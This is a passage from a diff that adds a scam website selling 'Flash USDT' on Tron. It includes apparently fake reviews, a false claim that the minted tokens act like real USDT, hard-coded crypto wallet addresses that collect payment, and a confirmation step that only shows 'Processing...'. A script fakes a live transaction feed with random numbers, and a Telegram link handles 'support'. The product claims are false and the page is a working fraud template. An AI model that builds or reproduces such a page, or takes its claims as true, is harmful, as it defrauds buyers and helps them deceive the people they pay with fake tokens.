+                            <div class="rv-stars"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></div>
+                        </div>
+                        <p class="rv-body">"The concierge team helped me test a 100k pack before committing. They replied in under 1 minute and the delivery was flawless. Only service I trust."</p>
+                        <div class="rv-foot">
+                            <span>Nov 28, 2023</span>
+                            <span class="rv-verified"><svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Verified</span>
+                        </div>
+                    </div>
+                    <div class="review">
+                        <div class="rv-head">
+                            <div class="rv-user">
+                                <div class="rv-avatar">R</div>
+                                <div>
+                                    <div class="rv-name">Raj P.</div>
+                                    <div class="rv-addr">TQ...aM2</div>
+                                </div>
+                            </div>
+                            <div class="rv-stars"><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg><svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></div>
+                        </div>
+                        <p class="rv-body">"I've used several flash services, VOLTIQ is the only one that actually delivered as promised. The USDT stayed on-chain for the full 180 days on my Trader pack."</p>
+                        <div class="rv-foot">
+                            <span>Dec 04, 2023</span>
+                            <span class="rv-verified"><svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>Verified</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="faq" class="section">
+            <div class="container faq-container">
+                <div class="section-head">
+                    <div class="chip">FAQ</div>
+                    <h2>Answers before you <span class="grad">connect</span></h2>
+                    <p>Still unsure? Ping our concierge desk from the widget in the bottom-right corner — connected wallets get priority.</p>
+                </div>
+
+                <div class="faq-list" id="faqList">
+                    <div class="faq-item">
+                        <button class="faq-q">
+                            What exactly is Flash USDT on TRC20?
+                            <span class="faq-icon"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 5v14"/><path d="M5 12h14"/></svg></span>
+                        </button>
+                        <div class="faq-a">Flash USDT is a special mint transaction that creates verifiable USDT tokens on the Tron blockchain. They act exactly like real USDT for swaps, transfers, and exchange deposits, but are minted on demand using a specific smart contract mechanism.</div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-q">
+                            Is VOLTIQ custodial? Do you ever touch my keys?
+                            <span class="faq-icon"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 5v14"/><path d="M5 12h14"/></svg></span>
+                        </button>
+                        <div class="faq-a">No, never. VOLTIQ is 100% non-custodial. You sign every transaction directly from your own wallet (TronLink, Trust Wallet, etc.). We only provide the broadcast infrastructure and the smart contract logic — your keys never leave your device.</div>
+                    </div>
+                    <div class="faq-item">
+                        <button class="faq-q">
+                            How long will my USDT last?
+                            <span class="faq-icon"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 5v14"/><path d="M5 12h14"/></svg></span>
+                        </button>
+                        <div class="faq-a">The flash-minted USDT remains on-chain for the full duration of your pack: 60 days (Starter), 180 days (Trader), 270 days (Whale), or 360 days (Institutional). After this period, the tokens will be automatically burned by the smart contract.</div>
+                    </div>
+                </div>
+
+                <div class="faq-cta">
+                    <div>
+                        <h4>Didn't find your answer?</h4>
+                        <p>Email us at <a href="mailto:support@voltiq.live">support@voltiq.live</a> — we reply within an hour, 24/7.</p>
+                    </div>
+                    <button class="btn btn-primary" data-open-modal="faq">Buy Flash USDT</button>
+                </div>
+            </div>
+        </section>
+
+        <section class="section final-cta-wrap">
+            <div class="container">
+                <div class="final-cta">
+                    <div class="final-cta-glow" aria-hidden="true"></div>
+                    <div class="final-cta-copy">
+                        <div class="chip">Ready when you are</div>
+                        <h2>Push your first Flash&nbsp;USDT <span class="grad">right now</span></h2>
+                        <p>One signature. Twenty-eight seconds. Fully on-chain. No custody, no waiting rooms, no support tickets.</p>
+                        <div class="final-cta-actions">
+                            <a href="#tariffs" class="btn btn-primary btn-lg">Choose a Flash Pack</a>
+                            <a href="#how" class="btn btn-ghost btn-lg">Read the flow</a>
+                        </div>
+                    </div>
+                    <div class="final-cta-mini">
+                        <div class="mini-row"><span class="dot"></span>Node cluster · online</div>
+                        <div class="mini-row"><span class="dot"></span>Mempool · 41 ms</div>
+                        <div class="mini-row"><span class="dot"></span>Concierge · 2 agents live</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container footer-inner">
+            <div class="foot-brand">
+                <a href="#top" class="brand">
+                    <span class="brand-logo" aria-hidden="true">
+                        <svg viewBox="0 0 64 64" width="28" height="28">
+                            <path fill="url(#lg)" d="M8 12 L56 12 L46 26 L34 60 L26 32 L8 22 Z"/>
+                        </svg>
+                    </span>
+                    <span class="brand-name">VOLTIQ</span>
+                </a>
+                <p>Flash-minted USDT for Tron TRC20. Signed by your wallet, broadcast by our nodes, visible on TronScan.</p>
+                <div class="foot-mail">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
+                    <a href="mailto:support@voltiq.live">support@voltiq.live</a>
+                </div>
+            </div>
+
+            <div class="foot-col">
+                <h5>Product</h5>
+                <a href="#tariffs">Tariffs</a>
+                <a href="#how">How it works</a>
+                <a href="#features">Features</a>
+                <a href="#reviews">Reviews</a>
+            </div>
+
+            <div class="foot-col">
+                <h5>Resources</h5>
+                <a href="#faq">FAQ</a>
+                <a href="#" data-doc="documentation">Documentation</a>
+                <a href="#" data-doc="security">Security audit</a>
+                <a href="#" data-doc="fees">Fee schedule</a>
+            </div>
+
+            <div class="foot-col">
+                <h5>Company</h5>
+                <a href="#" data-doc="terms">Terms</a>
+                <a href="#" data-doc="privacy">Privacy</a>
+                <a href="#" data-doc="contact">Contact</a>
+            </div>
+        </div>
+
+        <div class="container foot-bottom">
+            <div>© <span id="year"></span> VOLTIQ Labs · Registered in Zurich · CH-020.4.041.998-2</div>
+            <div class="foot-badges">
+                <span class="foot-badge">Non-custodial</span>
+                <span class="foot-badge">Tron Mainnet</span>
+                <span class="foot-badge">TronScan verified</span>
+            </div>
+        </div>
+    </footer>
+
+    <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+    <div class="support-widget" id="supportWidget">
+        <div class="sw-panel" id="swPanel" hidden>
+            <div class="sw-head">
+                <div class="sw-head-left">
+                    <div class="sw-avatar">
+                        <svg viewBox="0 0 24 24" width="18" height="18" fill="#fff"><path d="M4 6h16l-8 6L4 6z"/></svg>
+                    </div>
+                    <div class="sw-title-wrap">
+                        <div class="sw-title">VOLTIQ Support</div>
+                        <div class="sw-sub"><span class="sw-online"></span> Online · replies in ~1 min</div>
+                    </div>
+                </div>
+                <button class="sw-close" id="swClose" aria-label="Close support">
+                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+                </button>
+            </div>
+            <div class="sw-body">
+                <div class="sw-wallet-ico">
+                    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M16 12h4"/></svg>
+                </div>
+                <div class="sw-h">Connect to a support agent</div>
+                <p class="sw-p">Get instant help from our live support team. Click the button below to chat with an agent on Telegram.</p>
+                <a href="https://t.me/VoltiQofficial" target="_blank" rel="noopener noreferrer" class="btn btn-primary btn-block">
+                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21 12a8 8 0 1 0-3.7 6.7L21 21l-1.3-3.7A8 8 0 0 0 21 12z"/></svg>
+                    Connect Now
+                </a>
+                <div class="sw-note">We never see your keys or funds.</div>
+            </div>
+        </div>
+        <button class="sw-fab" id="swFab" aria-label="Open support">
+            <span class="sw-fab-icon" id="swFabIcon">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#fff" stroke-width="2"><path d="M21 12a8 8 0 1 0-3.7 6.7L21 21l-1.3-3.7A8 8 0 0 0 21 12z"/></svg>
+            </span>
+            <span class="sw-fab-online"></span>
+        </button>
+    </div>
+
+    <!-- PAYMENT MODAL -->
+    <div class="modal" id="paymentModal" aria-hidden="true" role="dialog">
+        <div class="modal-backdrop" data-close-modal></div>
+        <div class="modal-card">
+            <button class="modal-close" data-close-modal aria-label="Close">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+            
+            <div id="modalContent">
+                <!-- Step 1: Form -->
+                <div id="stepForm">
+                    <div class="modal-head">
+                        <h3>Complete Your Purchase</h3>
+                        <p>Enter your receiving TRX wallet, choose a payment network, and send the exact amount.</p>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Your TRX (TRC20) Wallet Address</label>
+                        <input type="text" class="form-input" id="trxWalletInput" placeholder="TXXXXXXXXXXXXX" />
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Select Payment Network</label>
+                        <select class="form-input" id="networkSelect">
+                            <option value="ETH">Ethereum</option>
+                            <option value="BTC">Bitcoin</option>
+                            <option value="TRX" selected>Tron</option>
+                            <option value="SOL">SOL</option>
+                            <option value="BNB">BNB</option>
+                        </select>
+                    </div>
+
+                    <div class="payment-details">
+                        <div class="payment-row">
+                            <span class="label">Package</span>
+                            <span class="value" id="modalPackageName">-</span>
+                        </div>
+                        <div class="payment-row">
+                            <span class="label">Price</span>
+                            <span class="value" id="modalPackagePrice">-</span>
+                        </div>
+                        <div class="payment-row">
+                            <span class="label">Network</span>
+                            <span class="value" id="modalNetworkLabel">Tron</span>
+                        </div>
+                        
+                        <div class="qr-container">
+                            <div class="qr-box" id="qrBox">
+                                <img id="qrImage" src="" alt="Payment QR Code" />
+                            </div>
+                        </div>
+
+                        <div class="payment-row">
+                            <span class="label">Wallet Address</span>
+                            <div class="value value-wrap">
+                                <span id="modalWalletAddress">TYaEpYrdFQRpzqxWByPJjWRerTqLYLGDRs</span>
+                                <button class="copy-btn" id="copyWalletBtn" aria-label="Copy wallet address">
+                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                                    Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="margin-top:16px;">
+                        <label class="form-label">Transaction Hash ID (Paste after sending payment)</label>
+                        <div class="tx-hash-row">
+                            <input type="text" class="form-input" id="txHashInput" placeholder="0x... or 0x... or 5K..." />
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button class="btn btn-primary btn-block" id="confirmPaymentBtn">Confirm Payment</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Confirmation/Waiting -->
+                <div id="stepConfirm" style="display:none;">
+                    <div class="confirm-state">
+                        <div class="processing-anim">
+                            <span></span><span></span><span></span>
+                        </div>
+                        <h4>Waiting for Confirmation</h4>
+                        <p>We are currently processing your transaction. Once confirmed, your target wallet will be credited with the Flash USDT.</p>
+                        <div style="padding:10px; border-radius:12px; background:rgba(255,255,255,0.03); border:1px solid var(--line); text-align:left; margin-bottom:16px;">
+                            <div style="display:flex; justify-content:space-between; font-size:13px; color:var(--text-mute);"><span>Status:</span><span style="color:#fbbf24;">Processing...</span></div>
+                            <div style="display:flex; justify-content:space-between; font-size:13px; color:var(--text-mute); margin-top:6px;"><span>TX Hash:</span><span class="mono" id="confirmHashDisplay" style="color:#fff;">-</span></div>
+                        </div>
+                        <button class="btn btn-ghost btn-block" data-close-modal>Close & Return Home</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Static Wallet Addresses
+            const WALLETS = {
+                ETH: '0x1899D0a12E40C60682348A3deee3798fd5b5fEcf',
+                BTC: 'bc1qtevsv7euldw58w5trfcv54r6kp9250hydsrcg2',
+                TRX: 'TYaEpYrdFQRpzqxWByPJjWRerTqLYLGDRs',
+                SOL: 'Hn5dFupiHb8cajqBf6Fq7gLBJWCLiDBPuShF2ZvDbkky',
+                BNB: '0x1899D0a12E40C60682348A3deee3798fd5b5fEcf'
+            };
+            
+            const NETWORK_LABELS = { ETH: 'Ethereum', BTC: 'Bitcoin', TRX: 'Tron', SOL: 'SOL', BNB: 'BNB' };
+            
+            // Package Data (Prices only)
+            const PACKAGES = {
+                'starter': { name: 'Starter Pack (1,000 USDT)', price: '$49' },
+                'trader': { name: 'Trader Pack (10,000 USDT)', price: '$249' },
+                'whale': { name: 'Whale Pack (100,000 USDT)', price: '$1,490' },
+                'institutional': { name: 'Institutional Pack (1,000,000 USDT)', price: '$11,900' },
+                'header': { name: 'Flash USDT Pack', price: 'Select below' },
+                'mobile': { name: 'Flash USDT Pack', price: 'Select below' },
+                'faq': { name: 'Flash USDT Pack', price: 'Select below' },
+                'support': { name: 'Flash USDT Pack', price: 'Select below' }
+            };
+
+            // DOM Elements
+            const modal = document.getElementById('paymentModal');
+            const modalContent = document.getElementById('modalContent');
+            const stepForm = document.getElementById('stepForm');
+            const stepConfirm = document.getElementById('stepConfirm');
+            const modalPackageName = document.getElementById('modalPackageName');
+            const modalPackagePrice = document.getElementById('modalPackagePrice');
+            const networkSelect = document.getElementById('networkSelect');
+            const modalNetworkLabel = document.getElementById('modalNetworkLabel');
+            const modalWalletAddress = document.getElementById('modalWalletAddress');
+            const copyWalletBtn = document.getElementById('copyWalletBtn');
+            const qrImage = document.getElementById('qrImage');
+            const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+            const txHashInput = document.getElementById('txHashInput');
+            const confirmHashDisplay = document.getElementById('confirmHashDisplay');
+            const toast = document.getElementById('toast');
+            let toastTimeout;
+
+            // Open Modal Logic
+            document.querySelectorAll('[data-open-modal]').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const packKey = btn.getAttribute('data-open-modal');
+                    const pack = PACKAGES[packKey] || PACKAGES['starter'];
+                    
+                    // Reset form state
+                    stepForm.style.display = 'block';
+                    stepConfirm.style.display = 'none';
+                    modalContent.style.display = 'block';
+                    document.getElementById('trxWalletInput').value = '';
+                    txHashInput.value = '';
+                    
+                    // Set Package Info
+                    modalPackageName.textContent = pack.name;
+                    modalPackagePrice.textContent = pack.price;
+                    
+                    // Reset to default network (TRX)
+                    networkSelect.value = 'TRX';
+                    updatePaymentDetails();
+                    
+                    modal.classList.add('open');
+                    document.body.style.overflow = 'hidden';
+                });
+            });
+
+            // Close Modal Logic
+            const closeModal = () => {
+                modal.classList.remove('open');
+                document.body.style.overflow = '';
+            };
+            document.querySelectorAll('[data-close-modal]').forEach(btn => {
+                btn.addEventListener('click', closeModal);
+            });
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) closeModal();
+            });
+
+            // Network Change Logic
+            networkSelect.addEventListener('change', updatePaymentDetails);
+            
+            function updatePaymentDetails() {
+                const network = networkSelect.value;
+                const address = WALLETS[network];
+                modalNetworkLabel.textContent = NETWORK_LABELS[network];
+                modalWalletAddress.textContent = address;
+                
+                // Generate QR Code via public API
+                if(address) {
+                    qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(address)}`;
+                }
+            }
+
+            // Copy Wallet Address Logic
+            copyWalletBtn.addEventListener('click', () => {
+                const address = modalWalletAddress.textContent;
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(address).then(() => {
+                        showToast('Wallet address copied to clipboard!');
+                    }).catch(() => {
+                        fallbackCopy(address);
+                    });
+                } else {
+                    fallbackCopy(address);
+                }
+            });
+
+            function fallbackCopy(text) {
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    showToast('Wallet address copied to clipboard!');
+                } catch (err) {
+                    showToast('Failed to copy address. Please copy it manually.');
+                }
+                document.body.removeChild(textArea);
+            }
+
+            // Confirm Payment Logic
+            confirmPaymentBtn.addEventListener('click', () => {
+                const trxWallet = document.getElementById('trxWalletInput').value.trim();
+                const txHash = txHashInput.value.trim();
+
+                if (!trxWallet) {
+                    showToast('Please enter your TRX wallet address.');
+                    return;
+                }
+                if (!txHash) {
+                    showToast('Please paste the transaction hash ID after sending the payment.');
+                    return;
+                }
+
+                // Switch to Confirmation State
+                stepForm.style.display = 'none';
+                stepConfirm.style.display = 'block';
+                confirmHashDisplay.textContent = txHash;
+
+                showToast('Transaction submitted! Waiting for network confirmation...');
+            });
+
+            // Toast Notification System
+            function showToast(message) {
+                toast.textContent = message;
+                toast.classList.add('show');
+                clearTimeout(toastTimeout);
+                toastTimeout = setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 4000);
+            }
+
+            // Hamburger Menu logic
+            const hamburger = document.getElementById('hamburger');
+            const mobileMenu = document.getElementById('mobileMenu');
+            hamburger.addEventListener('click', () => {
+                hamburger.classList.toggle('open');
+                mobileMenu.classList.toggle('open');
+            });
+
+            // Year update
+            document.getElementById('year').textContent = new Date().getFullYear();
+            
+            // Support Widget Toggle
+            const swFab = document.getElementById('swFab');
+            const swPanel = document.getElementById('swPanel');
+            const swClose = document.getElementById('swClose');
+            
+            swFab.addEventListener('click', () => {
+                swPanel.hidden = !swPanel.hidden;
+            });
+            swClose.addEventListener('click', () => {
+                swPanel.hidden = true;
+            });
+
+            // ==========================================
+            // LIVE FLASH FEED SIMULATION
+            // ==========================================
+            const feedList = document.getElementById('heroFeed');
+            const wallets = [
+                { addr: 'TVTF...RVWw', color: 'blue' },
+                { addr: 'THTq...qqCV', color: 'red' },
+                { addr: 'TRvm...g3gZ', color: 'blue' },
+                { addr: 'TfJS...Cr20', color: 'red' },
+                { addr: 'ThdG...tg00', color: 'blue' },
+                { addr: 'T9xK...pL21', color: 'red' },
+                { addr: 'TU54...mB88', color: 'blue' },
+                { addr: 'TJ9c...qqZ2', color: 'red' }
+            ];
+            const amounts = [50000, 10000, 50000, 5000, 25000, 15000, 12000, 8000, 30000, 7500];
+            
+            let items = [];
+
+            function formatNumber(num) {
+                return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            }
+
+            function createFeedItem(amount, wallet, timeAgo) {
+                const li = document.createElement('li');
+                li.className = 'hf-item';
+                li.innerHTML = `
+                    <div class="hf-bolt">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/></svg>
+                    </div>
+                    <div class="hf-main">
+                        <span class="hf-amount">${formatNumber(amount)}</span>
+                        <span class="hf-unit">USDT</span>
+                        <span class="hf-arrow">→</span>
+                        <span class="hf-to">${wallet.addr}</span>
+                    </div>
+                    <div class="hf-meta">
+                        <span class="hf-wallet ${wallet.color}"></span>
+                        <span>${timeAgo}</span>
+                        <span class="hf-check">
+                            <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>
+                        </span>
+                    </div>
+                `;
+                return li;
+            }
+
+            function renderFeed() {
+                feedList.innerHTML = '';
+                // Render latest 5 items
+                const latestItems = items.slice(0, 5);
+                latestItems.forEach(item => {
+                    const el = createFeedItem(item.amount, item.wallet, item.timeAgo);
+                    feedList.appendChild(el);
+                });
+            }
+
+            function addTransaction() {
+                const amount = amounts[Math.floor(Math.random() * amounts.length)];
+                const wallet = wallets[Math.floor(Math.random() * wallets.length)];
+                
+                // Random time between 1 and 30 seconds ago
+                const seconds = Math.floor(Math.random() * 30) + 1;
+                const timeAgo = `${seconds}s ago`;
+                
+                items.unshift({ amount, wallet, timeAgo });
+                
+                // Keep max 15 items
+                if (items.length > 15) {
+                    items.pop();
+                }
+                
+                renderFeed();
+            }
+
+            // Initial population
+            for (let i = 0; i < 5; i++) {
+                const amount = amounts[Math.floor(Math.random() * amounts.length)];
+                const wallet = wallets[Math.floor(Math.random() * wallets.length)];
+                const seconds = (i * 4) + Math.floor(Math.random() * 4) + 1;
+                const timeAgo = `${seconds}s ago`;
+                items.push({ amount, wallet, timeAgo });
+            }
+            renderFeed();
+
+            // Simulate new transactions every 2-3 seconds
+            setInterval(() => {
+                addTransaction();
+            }, Math.floor(Math.random() * 1000) + 2000); // 2 to 3 seconds
+
+        });
+    </script>
+</body>
+</html>
